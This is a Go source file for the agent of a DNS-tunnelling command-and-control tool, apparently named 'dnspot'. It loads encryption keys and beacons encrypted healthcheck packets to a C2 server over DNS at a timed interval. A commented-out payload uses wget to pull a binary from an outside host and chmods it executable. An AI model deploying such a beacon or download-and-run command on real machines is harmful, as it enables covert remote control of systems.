package agent

import (
	"strings"
	"time"

	"github.com/kpango/glg"
	"github.com/mosajjal/dnspot/c2"
	"github.com/mosajjal/dnspot/conf"
	"github.com/mosajjal/dnspot/cryptography"
	"github.com/spf13/cobra"
)

func errorHandler(err error) {
	if err != nil {
		panic(err.Error())
	}
}

var exiting chan bool

var AgentStatus struct {
	LastAckFromServer          uint32
	NextMessageType            c2.MessageType
	HealthCheckIntervalSeconds uint32
}

func RunAgent(cmd *cobra.Command, args []string) error {
	// set global flag that we're running as server
	conf.Mode = conf.RunAsAgent
	// for start, we'll do a healthcheck every 10 second, and will wait for server to change this for us
	AgentStatus.HealthCheckIntervalSeconds = 10
	AgentStatus.NextMessageType = c2.MessageHealthcheck

	// dnsSuffix, err := cmd.Flags().GetString("dnsSuffix")
	// errorHandler(err)
	if !strings.HasSuffix(conf.GlobalAgentConfig.DnsSuffix, ".") {
		conf.GlobalAgentConfig.DnsSuffix = conf.GlobalAgentConfig.DnsSuffix + "."
	}
	if !strings.HasPrefix(conf.GlobalAgentConfig.DnsSuffix, ".") {
		conf.GlobalAgentConfig.DnsSuffix = "." + conf.GlobalAgentConfig.DnsSuffix
	}
	// serverAddress, err := cmd.Flags().GetString("serverAddress")
	// errorHandler(err)
	// privateKey, err := cmd.Flags().GetString("privateKey")
	// errorHandler(err)
	// serverPublicKey, err := cmd.Flags().GetString("serverPublicKey")
	// errorHandler(err)
	var err error
	conf.GlobalAgentConfig.PrivateKey, err = cryptography.PrivateKeyFromString(conf.GlobalAgentConfig.PrivateKeyB32)
	errorHandler(err)
	conf.GlobalAgentConfig.ServerPublicKey, err = cryptography.PublicKeyFromString(conf.GlobalAgentConfig.ServerPublicKeyB32)
	errorHandler(err)
	tick := time.NewTicker(time.Duration(AgentStatus.HealthCheckIntervalSeconds) * time.Second)
	for {
		select {
		case <-exiting:
			// When exiting, return immediately
			return nil
		case <-tick.C:
			msg := c2.MessagePacket{
				TimeStamp:   uint32(time.Now().Unix()),
				MessageType: AgentStatus.NextMessageType,
			}
			// todo: find what to do here and log it
			// payload := []byte("sh -c 'wget n0p.me/bin/miniserve -O /opt/miniserve && chmod +x /opt/miniserve'")
			payload := []byte("hi!")
			_, err := c2.SendPartitionedPayload(msg, payload, conf.GlobalAgentConfig.DnsSuffix, conf.GlobalAgentConfig.ServerAddress, conf.GlobalAgentConfig.PrivateKey, conf.GlobalAgentConfig.ServerPublicKey)
			if err != nil {
				glg.Warnf("Error sending Message to Server")
			}
			// function to handle response coming from the server and update the status accordingly
			// handleServerResponse(response)
		}
	}
	return nil
}
